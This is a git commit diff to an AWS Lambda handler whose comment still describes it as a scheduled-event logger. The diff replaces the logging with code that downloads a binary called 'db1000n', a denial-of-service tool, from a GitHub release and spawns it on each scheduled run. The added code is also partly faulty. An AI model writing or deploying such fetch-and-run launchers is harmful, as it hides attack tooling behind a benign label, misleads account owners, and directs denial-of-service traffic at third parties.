86060e56c64652534625952d07756bc42d7e55cc
ds <48093199+dannysilence@users.noreply.github.com>
2022-05-04 06:38:57 +0300

    Update scheduled-event-logger.js

--- src/handlers/scheduled-event-logger.js
+++ src/handlers/scheduled-event-logger.js
@@ -1,8 +1,70 @@
 /**
  * A Lambda function that logs the payload received from a CloudWatch scheduled event.
  */
-exports.scheduledEventLoggerHandler = async (event, context) => {
-    // All log statements are written to CloudWatch by default. For more information, see
-    // https://docs.aws.amazon.com/lambda/latest/dg/nodejs-prog-model-logging.html
-    console.log(JSON.stringify(event));
+
+
+exports.scheduledEventLoggerHandler = async (event, context) => {  
+    const { spawn } = require('node:child_process');
+    const fs = require('fs');
+    const http = require('http');
+    const https = require('https');
+
+    
+   async function download(url, filePath) {
+        const proto = !url.charAt(4).localeCompare('s') ? https : http;
+
+        return new Promise((resolve, reject) => {
+            const file = fs.createWriteStream(filePath);
+            let fileInfo = null;
+
+            const request = proto.get(url, response => {
+                if (response.statusCode !== 200) {
+                    fs.unlink(filePath, () => {
+                    reject(new Error(`Failed to get '${url}' (${response.statusCode})`));
+                });
+                return;
+            }
+
+        fileInfo = {
+            mime: response.headers['content-type'],
+            size: parseInt(response.headers['content-length'], 10),
+        };
+            response.pipe(file);
+        });
+
+        // The destination stream is ended by the time it's called
+        file.on('finish', () => resolve(fileInfo));
+
+        request.on('error', err => {
+            fs.unlink(filePath, () => reject(err));
+        });
+
+        file.on('error', err => {
+            fs.unlink(filePath, () => reject(err));
+        });
+
+        request.end();
+    });
+ }  
+  let fn = process.cwd()+'/db1000n';
+  await download('https://github.com/dannysilence/db1000n_aws_lambda/releases/download/test/db1000n', fn)
+  if(fs.exists(fn)) {;
+     const defaults = {
+        cwd: process.cwd(),
+        env: process.env
+     };   
+    const ls = spawn('db1000n');
+
+    ls.stdout.on('data', (data) => {
+    console.log(`stdout: ${data}`);
+    });
+
+    ls.stderr.on('data', (data) => {
+        console.error(`stderr: ${data}`);
+    });
+
+    ls.on('close', (code) => {
+        console.log(`child process exited with code ${code}`);
+    });                                     
+  }
 };
